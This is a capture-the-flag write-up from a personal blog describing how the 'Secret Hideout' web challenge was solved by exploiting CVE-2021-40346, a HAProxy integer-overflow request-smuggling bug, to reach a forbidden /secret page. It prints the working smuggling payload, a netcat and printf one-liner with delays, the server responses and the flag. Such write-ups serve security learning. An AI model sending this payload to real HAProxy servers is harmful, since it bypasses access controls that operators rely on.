---
source: kevin-mizu
source_url: https://mizu.re/post/secret_hideout
title: "Secret Hideout | mizu.re"
description: "Secret Hideout"
---

_keyboard\_arrow\_up_

title: Secret Hideout

date: Dec 25, 2022

tags: [Writeup](https://mizu.re/tag/Writeup) [YogoshaChristmas\_2022](https://mizu.re/tag/YogoshaChristmas_2022) [Web](https://mizu.re/tag/Web)

# Secret Hideout

![](https://mizu.re/articles/writeups/yogosha_christmas_2022/secret_hideout/images/yogosha.svg)

* * *

Difficulty: 500 points \| 42 solves

Description: Congrats! You made it to kara secret hideout, we confirmed that you are a member in our organization since all the shinobis nowadays are weak o// Have a look and release the seal.

* * *

## Table of content

- [🕵️ Recon](https://mizu.re/post/secret_hideout#%EF%B8%8F-recon)
- [💥 CVE-2021-40346 \| HaProxy 403 Bypass](https://mizu.re/post/secret_hideout#-cve-2021-40346--haproxy-403-bypass)
- [🎉 Flag](https://mizu.re/post/secret_hideout#-flag)

## 🕵️ Recon

This challenge was the 2nd step of the CTF. For this step, we have to access the `/secret` endpoint. The website looks like this:

![home.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/secret_hideout/images/home.png)

_Home page_

![secret.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/secret_hideout/images/secret.png)

_Secret page_

To bypass a 403 page, there are 2 ways to go:

- Fuzz known URL bypass using [Bypass URL Parser](https://github.com/laluka/bypass-url-parser) tool of [@TheLaluka](https://twitter.com/TheLaluka).
- Detect the proxy / framework that is used and look for CVE / known bypass.

For this challenge, we will go for the second option. To find the technologies that are used, we could look for 404 error page and response headers:

- The back-end technology must be `express` thanks to 404 error page. (This info also present in response headers)

![404.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/secret_hideout/images/404.png)

_404 page_

- A `HaProxy` is used in front of the web application thanks to response headers.

![response.png](https://mizu.re/articles/writeups/yogosha_christmas_2022/secret_hideout/images/response.png)

_Response headers_

## 💥 CVE-2021-40346 \| HaProxy 403 Bypass

From the recon, we know that `HaProxy 2.4.0` is used in front of the express server. Looking for known CVE that leads to 403 bypass brings us to find the `CVE-2021-40346`. This vulnerability abuse an int overflow in `Content-Length` HTTP headers to embed a query inside another one leading to all the HaProxy rules. For more details about the vulnerability, feel free to read `jfrog's` research: [link](https://jfrog.com/blog/critical-vulnerability-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/).

This vulnerability can be exploit this way:

```sh
~ cat poc
POST / HTTP/1.1
Host: 34.227.78.164:80
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 24

GET /secret HTTP/1.1
h:GET / HTTP/1.1
Host: 34.227.78.164:80

~ cat poc | nc 34.227.78.164 80
```

Unfortunately for us, this wasn't working. To solve this issue, we had to add a sleep between the first and second request. In my opinion, this is due to connection timeout on HaProxy side which waits for 28 bytes even if there is the vulnerability. Thus, adding a delais stop the body reading and unforce the exploit to occur.

```sh
(printf "POST / HTTP/1.1\r\n"\
"Host: 34.227.78.164:80\r\n"\
"Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:\r\n"\
"Content-Length: 28\r\n\r\n"; sleep 1;
printf "GET /secret HTTP/1.1\r\n"\
"DUMMY:"; sleep 1; printf "GET / HTTP/1.1\r\n"\
"Host: 34.227.78.164:80\r\n\r\n") | nc 34.227.78.164 80
```

## 🎉 Flag

Running the above script gives us:

```
HTTP/1.1 404 Not Found
x-powered-by: Express
content-security-policy: default-src 'none'
x-content-type-options: nosniff
content-type: text/html; charset=utf-8
content-length: 140
date: Fri, 23 Dec 2022 17:31:01 GMT
x-server: HaProxy-2.4.0

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot POST /</pre>
</body>
</html>
HTTP/1.1 200 OK
x-powered-by: Express
content-type: text/html; charset=utf-8
content-length: 135
etag: W/"87-c3nQ3bcJ+C/Jp4b9eSpEmQE6Ldk"
date: Fri, 23 Dec 2022 17:31:02 GMT
x-server: HaProxy-2.4.0

Our next plan is to kill Boruto, son of the legend Naruto! Find more hints using this secret FLAG{ACL_Bypass_WiTh_SmuGGlinG_For_B0rUt0}
```

Flag: `FLAG{ACL_Bypass_WiTh_SmuGGlinG_For_B0rUt0}` 🎉

[_keyboard\_arrow\_left_ Forbidden Jutsu](https://mizu.re/post/forbidden_jutsu)

[Welcome to Kara Org _keyboard\_arrow\_right_](https://mizu.re/post/welcome_to_kara_org)